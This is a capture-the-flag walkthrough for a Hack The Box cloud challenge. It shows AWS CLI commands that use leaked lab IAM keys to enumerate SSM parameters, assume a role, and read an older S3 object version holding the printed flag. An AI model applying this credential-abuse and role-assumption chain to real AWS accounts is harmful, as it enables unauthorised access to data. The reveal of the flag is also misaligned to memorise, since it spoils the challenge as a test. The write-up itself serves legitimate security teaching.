# False Ferry - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Cloud (AWS API misconfiguration, emulated via LocalStack) |
| Tech stack | LocalStack (SSM Parameter Store, STS, S3 with versioning), custom Python briefing page |
| Flag location | Oldest version of an S3 object, referenced by version ID inside an SSM parameter |
| Vulnerability chain | Leaked starting IAM credentials -> SSM Parameter Store enumeration (path/history queries denied on purpose) -> a trusted parameter's role ARN + external ID -> STS AssumeRole -> S3 object version history reveals the untampered original object |
| Flag | `HTB{ferry_crossing_dock_seal_003678fa1f9ccb5fa3f7facace6eb1ed}` |

---

## Overview - How The App Works

```
[You] --> :31285  PhoenixBriefing (Python http.server) - lore page + /player-creds.json
       --> :30413  LocalStack - emulated AWS API (SSM, STS, S3)
```

Two endpoints, same challenge. Port `31285` is a plain static briefing page serving the challenge
lore plus a `/player-creds.json` endpoint containing a starting IAM access key. Port `30413` is
LocalStack - a real AWS API surface, just running locally instead of on actual AWS. `nmap`
misidentified it as `rtsp`/`sip`; the giveaway is LocalStack's characteristic `x-amz-*` response
headers and its `AccessDeniedException` / `MissingAuthentication` JSON error bodies.

The lore text describes two disagreeing sources of truth (a "route board" and a "crew roster")
and asks for "the earlier crossing list" to prove which one was tampered with - a direct pointer
at S3 object versioning: the current version of an object has been overwritten, but an older,
still-retrievable version proves what the data originally said.

---

## Step 1 - Starting Credentials

```bash
curl -s http://154.57.164.67:31285/player-creds.json
```

Returns a long-term IAM key for user `coalition-ferry-clerk`:

```json
{
  "access_key_id": "AKIAMH7O12MR0UZRUAV3",
  "secret_access_key": "DLVfDHeZ9aofITj5kDyTWpgFHG5uSKiP+50I7EKF",
  "region": "us-east-1"
}
```

Pointed the AWS CLI at LocalStack and confirmed the identity:

```bash
export AWS_ACCESS_KEY_ID=AKIAMH7O12MR0UZRUAV3
export AWS_SECRET_ACCESS_KEY=DLVfDHeZ9aofITj5kDyTWpgFHG5uSKiP+50I7EKF
export AWS_DEFAULT_REGION=us-east-1
export AWS_ENDPOINT_URL=http://154.57.164.67:30413

aws sts get-caller-identity
```

---

## Step 2 - SSM Parameter Store Enumeration

The obvious first move, `ssm get-parameters-by-path` and `ssm get-parameter-history`, are both
explicitly denied for this user - a deliberate red herring pointing away from SSM's own version
history as the intended path. Enumeration still works via `describe-parameters`:

```bash
aws ssm describe-parameters
```

This returned 8 parameters under `/ferry/crossing/`:

- `live-crossing-id` -> value `CROSSING-7A3F` (the "route board" - the pointer everyone is
  supposed to trust)
- `CROSSING-7A3F` - the one parameter with `status: AUTHORIZED`, issued by
  `stormbound-coalition-ferry-office`
- `CROSSING-VOID-9B11`, `CLOSED-5E22`, `DRAFT-8D40`, `VOID-3C21`, `VOID-1A04`, `VOID-2D77` -
  decoys, all issued by a different, untrusted `third-party-archive` issuer, pointing at other
  manifest keys (draft/closeout/archived batches)

Fetching the authorized parameter:

```bash
aws ssm get-parameter --name CROSSING-7A3F
```

```json
{
  "status": "AUTHORIZED",
  "issuer": "stormbound-coalition-ferry-office",
  "manifest_bucket": "ferry-crossing-manifest",
  "manifest_object_key": "manifests/morning-crossing-order.txt",
  "manifest_version_id": "5acfa13b-2b38-4294-84ef-aed7672ef37c",
  "scanner_role_arn": "arn:aws:iam::584729103648:role/ferry-crossing-scanner",
  "scanner_external_id": "ferry-crossing-scanner-7a3f"
}
```

This is the whole game: a trusted parameter naming a specific S3 object *and a specific version
of it*, plus a role to assume in order to actually read it.

---

## Step 3 - AssumeRole

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::584729103648:role/ferry-crossing-scanner \
  --role-session-name ferry-scan \
  --external-id ferry-crossing-scanner-7a3f
```

Succeeded, returning temporary credentials with read access to the manifest bucket.

---

## Step 4 - S3 Object Versioning Reveals The Tampering

```bash
export AWS_ACCESS_KEY_ID=<temp key>
export AWS_SECRET_ACCESS_KEY=<temp secret>
export AWS_SESSION_TOKEN=<temp token>

aws s3api list-object-versions \
  --bucket ferry-crossing-manifest \
  --prefix manifests/morning-crossing-order.txt
```

Three versions of the same key came back:

| Version | Size | Content points to | Notes |
|---|---|---|---|
| latest (`c87eb830...`) | 129 | `CROSSING-VOID-9B11`, status RELEASED | the tampered current manifest - "the crew roster" sending the boat to Vaultrune's dock |
| middle (`8aa48394...`) | 99 | `CROSSING-DRAFT-8D40` | decoy |
| oldest (`5acfa13b-2b38-4294-84ef-aed7672ef37c`) | 157 | - | the exact version ID cited in the AUTHORIZED SSM parameter |

Fetching the oldest version specifically:

```bash
aws s3api get-object \
  --bucket ferry-crossing-manifest \
  --key manifests/morning-crossing-order.txt \
  --version-id 5acfa13b-2b38-4294-84ef-aed7672ef37c \
  manifest.txt

cat manifest.txt
```

```
CROSSING RELEASE RECORD
Batch: CROSSING-7A3F
Authorized by: Stormbound Coalition Ferry Office

HTB{ferry_crossing_dock_seal_003678fa1f9ccb5fa3f7facace6eb1ed}
```

The current version of the object had been silently overwritten to point at the VOID-9B11 batch,
but S3 kept the original version around, and the one trusted SSM parameter pointed straight at it
by version ID - exactly the proof of tampering the lore describes.

---

## Full Exploit Chain

```
1. GET /player-creds.json -> starting IAM key for coalition-ferry-clerk.
2. aws ssm describe-parameters -> enumerate /ferry/crossing/ namespace (GetParametersByPath and
   GetParameterHistory are both denied on purpose - describe-parameters is the way in).
3. Identify the one AUTHORIZED parameter among several decoy VOID/CLOSED/DRAFT ones -> read its
   scanner_role_arn, scanner_external_id, manifest_bucket, manifest_object_key,
   manifest_version_id.
4. sts assume-role with that role ARN + external ID -> temporary credentials.
5. s3api list-object-versions on the cited key -> current version is tampered, but the
   manifest_version_id from the trusted parameter points at the original, untampered version.
6. s3api get-object with that exact version-id -> flag.
```

---

## Key Takeaways

| Concept | Detail |
|---|---|
| Fingerprint before assuming | LocalStack's port gets misidentified by generic service scanners - `x-amz-*` headers and AWS-shaped JSON error bodies are the real tell |
| Denied APIs can be a map, not a wall | `GetParametersByPath`/`GetParameterHistory` being explicitly denied is itself information - it rules out the "obvious" path and points toward the real one (S3 versioning instead of SSM history) |
| A trusted config can name its own proof | The one AUTHORIZED parameter didn't just point at a bucket/key, it pinned an exact S3 version ID - treating that as ground truth is what let a tampered "latest" object get bypassed cleanly |
| Object storage versioning as an audit trail | When the current state of an object can't be trusted, check whether the bucket has versioning enabled and whether an older version is still readable - the "before" state often survives even after the "after" state is corrupted |
| Least-privilege role chaining | A narrow starting IAM user existing only to read one config value and assume one specific role (with an external ID gate) is a realistic real-world AWS pattern, not just a CTF mechanic |
